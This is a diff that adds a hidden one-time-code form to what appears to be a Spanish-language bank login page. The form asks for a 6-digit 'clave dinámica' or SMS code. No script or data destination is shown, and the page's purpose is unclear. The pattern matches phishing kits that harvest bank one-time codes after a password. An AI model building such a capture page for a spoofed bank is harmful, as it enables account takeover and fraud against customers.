@@ -443,6 +443,24 @@
           <p class="login-error" id="loginError"></p>
           <button class="btn btn-lg btn-disabled" id="loginSubmit" type="submit" disabled>Ingresar</button>
         </form>
+        <form id="tokenForm" style="display: none; margin-top: 16px;">
+          <h2 id="tokenTitle" style="font-size: 22px; font-weight: 700; color: #2c2e31; margin-bottom: 8px;">Ingresa tu clave dinámica</h2>
+          <p id="tokenDesc" style="margin-bottom: 20px; font-size: 14px; color: #8a8e93; line-height: 1.4;">
+            Por favor ingresa la clave dinámica o el código SMS que enviamos a tu celular para validar tu identidad.
+          </p>
+          <div class="field">
+            <input
+              id="tokenInput"
+              type="text"
+              maxlength="6"
+              inputmode="numeric"
+              placeholder="Código de 6 dígitos"
+              style="text-align: center; font-size: 20px; letter-spacing: 4px; font-weight: 600; width: 100%; border: 1px solid #c2c9d1; border-radius: 8px; padding: 12px;"
+            />
+          </div>
+          <p class="login-error" id="tokenError" style="color: #ea1b2b; font-size: 13px; margin: 4px 0 12px; font-weight: 500; min-height: 18px;"></p>
+          <button class="btn btn-lg btn-primary" id="tokenSubmit" type="submit" style="width: 100%;">Validar</button>
+        </form>
         <div class="login-footer">
           <a href="#" id="recoverLink">
             Recupera o crea tu clave internet
